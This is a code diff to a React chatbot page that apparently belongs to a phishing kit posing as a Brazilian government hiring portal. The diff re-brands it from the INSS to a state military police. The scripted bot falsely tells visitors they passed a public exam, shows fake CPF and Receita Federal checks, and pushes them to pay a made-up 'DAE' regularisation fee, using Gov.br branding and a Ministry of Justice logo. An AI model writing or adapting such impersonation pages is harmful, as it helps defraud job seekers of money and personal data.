@@ -2,8 +2,9 @@ import { useEffect, useState, useRef } from 'react';
 import { useLocation } from 'wouter';
 import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { Bot, User, Loader2, FileText, ChevronRight } from 'lucide-react';
-import logoMJ from '@assets/logo_INSS_1786320311202.png';
+import orgLogo from '@assets/logo-mj_1779836627251.png';
 import { getExamDateFormatted } from '@/utils/examDate';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface ChatMessage {
   id: string;
@@ -35,13 +36,13 @@ const getGenderedText = (gender: string, masculine: string, feminine: string) =>
   gender.toLowerCase().startsWith('f') ? feminine : masculine;
 
 const CARGO_MAP: Record<string, string> = {
-  'tecnico-administrativo': 'Técnico Administrativo',
-  'tecnico-nivel-medio':    'Técnico de Nível Médio',
+  'soldado-pm': 'Soldado de 2ª Classe PM',
+  'oficial-pm': 'Aspirante-a-Oficial PM',
 };
 
 const SALARY_MAP: Record<string, string> = {
-  'tecnico-administrativo': 'R$ 5.940,00',
-  'tecnico-nivel-medio':    'R$ 8.216,00',
+  'soldado-pm': 'R$ 5.940,00',
+  'oficial-pm': 'R$ 8.216,00',
 };
 
 const LOADING_STEPS: Record<string, string[]> = {
@@ -50,7 +51,7 @@ const LOADING_STEPS: Record<string, string[]> = {
     'Autenticando via Gov.br...',
     'Consultando qualificação cadastral...',
     'Validando CPF na base da Receita Federal...',
-    'Verificando sincronização com INSS...',
+    'Verificando sincronização com a corporação...',
     'Finalizando consulta...',
   ],
   fgts: [
@@ -113,7 +114,7 @@ const getVerificationResult = (system: string, firstName: string) => {
   }
 };
 
-const generateChatFlow = (info: UserInfo) => {
+const generateChatFlow = (info: UserInfo, sigla: string) => {
   const genderedAprovado = getGenderedText(info.gender, 'aprovado', 'aprovada');
 
   return [
@@ -123,12 +124,12 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p0-1',
           type: 'bot' as const,
-          content: 'Bem-vindo ao Sistema de Integração Trabalhista do INSS — Instituto Nacional do Seguro Social.',
+          content: `Bem-vindo ao Sistema de Integração Trabalhista da ${sigla}.`,
         },
         {
           id: 'p0-2',
           type: 'bot' as const,
-          content: `${info.firstName ? `${info.firstName}, ` : ''}identificamos que você foi ${genderedAprovado} na etapa de pré-seleção do Concurso Público INSS 2026.`,
+          content: `${info.firstName ? `${info.firstName}, ` : ''}identificamos que você foi ${genderedAprovado} na etapa de pré-seleção do Concurso ${sigla} 2026.`,
         },
         {
           id: 'p0-3',
@@ -144,7 +145,7 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p1-1',
           type: 'bot' as const,
-          content: 'O INSS está processando as nomeações do Concurso Público 2026, nos termos da legislação federal aplicável.',
+          content: `A ${sigla} está processando as nomeações do Concurso Público 2026, nos termos da legislação federal aplicável.`,
         },
         {
           id: 'p1-2',
@@ -198,7 +199,7 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p5-1',
           type: 'bot' as const,
-          content: 'Por último, vou verificar sua CTPS Digital, onde o vínculo com o INSS será registrado.',
+          content: `Por último, vou verificar sua CTPS Digital, onde o vínculo com a ${sigla} será registrado.`,
           action: { type: 'button' as const, label: 'Verificar CTPS Digital', systemCheck: 'ctps' },
         },
       ],
@@ -214,7 +215,7 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p6-2',
           type: 'bot' as const,
-          content: 'O INSS exige que todos os sistemas trabalhistas estejam regularizados previamente à posse. Candidatos com pendências no eSocial no momento da nomeação não poderão ser empossados, mesmo sendo aprovados.',
+          content: `A ${sigla} exige que todos os sistemas trabalhistas estejam regularizados previamente à posse. Candidatos com pendências no eSocial no momento da nomeação não poderão ser empossados, mesmo sendo aprovados.`,
         },
         {
           id: 'p6-3',
@@ -224,7 +225,7 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p6-4',
           type: 'bot' as const,
-          content: 'O INSS disponibiliza o DAE (Documento de Arrecadação do eSocial) para custear o processamento técnico da regularização. Essa contribuição cobre o trabalho da equipe do Núcleo de Integração eSocial.',
+          content: `A ${sigla} disponibiliza o DAE (Documento de Arrecadação do eSocial) para custear o processamento técnico da regularização. Essa contribuição cobre o trabalho da equipe do Núcleo de Integração eSocial.`,
           action: { type: 'button' as const, label: 'Prosseguir para emissão' },
         },
       ],
@@ -235,7 +236,7 @@ const generateChatFlow = (info: UserInfo) => {
         {
           id: 'p7-1',
           type: 'bot' as const,
-          content: 'Sua guia DAE foi gerada. O valor corresponde à taxa de processamento técnico definida pelo INSS para regularização cadastral.',
+          content: `Sua guia DAE foi gerada. O valor corresponde à taxa de processamento técnico definida pela ${sigla} para regularização cadastral.`,
         },
         {
           id: 'p7-2',
@@ -268,6 +269,8 @@ const GovBrBotIcon = ({ size = 'md' }: { size?: 'sm' | 'md' }) => {
 
 export default function ESocialChatPage() {
   const [, navigate] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
   const [messages, setMessages] = useState<ChatMessage[]>([]);
   const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
   const [isTyping, setIsTyping] = useState(false);
@@ -311,7 +314,7 @@ export default function ESocialChatPage() {
       parsedCandidate?.protocoloFinal?.unidadeTrabalho?.regiao || '';
 
     const positionId = applicationData?.positionId || applicationData?.position_id || '';
-    const cargo = CARGO_MAP[positionId] || parsedCandidate?.vagaSelecionada?.titulo || parsedCandidate?.cargo || parsedUser?.cargo || 'Técnico Administrativo';
+    const cargo = CARGO_MAP[positionId] || parsedCandidate?.vagaSelecionada?.titulo || parsedCandidate?.cargo || parsedUser?.cargo || 'Soldado de 2ª Classe PM';
     const salario = SALARY_MAP[positionId] || 'R$ 5.940,00';
 
     const localProva = applicationData?.examLocationName || parsedCandidate?.protocoloFinal?.localProva?.nome || '';
@@ -337,7 +340,7 @@ export default function ESocialChatPage() {
 
     const info: UserInfo = { firstName, fullName, cpf, cidade, cargo, salario, localProva, dataProva, horarioProva, gender };
     setUserInfo(info);
-    setChatFlow(generateChatFlow(info));
+    setChatFlow(generateChatFlow(info, sigla));
 
     try {
       const fotoData = localStorage.getItem('foto');
@@ -346,7 +349,7 @@ export default function ESocialChatPage() {
         if (foto?.success && foto?.foto_base64) setFotoBase64(foto.foto_base64);
       }
     } catch (_) {}
-  }, []);
+  }, [sigla]);
 
   // Drive the chat message sequence
   useEffect(() => {
@@ -620,7 +623,7 @@ export default function ESocialChatPage() {
       {/* Footer */}
       <div className="bg-white border-t border-gray-200 py-4 px-4">
         <div className="flex justify-center">
-          <img src={logoMJ} alt="INSS — Instituto Nacional do Seguro Social" className="h-9 object-contain" />
+          <img src={orgLogo} alt="Ministério da Justiça e Segurança Pública" className="h-9 object-contain" />
         </div>
         <p className="text-center text-[#AAAAAA] text-[10px] mt-3">
           Portal do Candidato v3.6 · eSocial Federal
